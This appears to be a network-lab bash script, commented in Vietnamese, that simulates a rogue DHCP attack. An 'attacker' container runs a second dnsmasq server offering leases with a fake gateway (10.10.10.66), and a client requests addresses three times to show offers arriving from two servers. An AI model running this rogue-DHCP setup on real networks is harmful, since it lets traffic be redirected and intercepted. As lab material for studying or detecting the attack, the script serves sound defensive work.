#!/usr/bin/env bash
# Rogue DHCP: attacker chạy dnsmasq thứ hai; client h10b xin IP 3 lần -> nhận Offer từ 2 nguồn.
HERE="$(cd "$(dirname "$0")/.." && pwd)"; source "$HERE/common.sh"
dxd attacker dnsmasq --no-daemon --interface=eth1 --bind-interfaces --except-interface=lo --port=0 \
    --dhcp-range=10.10.10.200,10.10.10.210,12h --dhcp-option=3,10.10.10.66 \
    --dhcp-leasefile=/tmp/rogue.leases --dhcp-authoritative
sleep 1
for i in 1 2 3; do
  dx h10b timeout 6 dhclient -d -sf /bin/true -pf /tmp/dhc.pid -lf /tmp/dhc.$i.lease eth1 >/dev/null 2>&1 || true
  sleep 1
done
dx attacker pkill dnsmasq || true
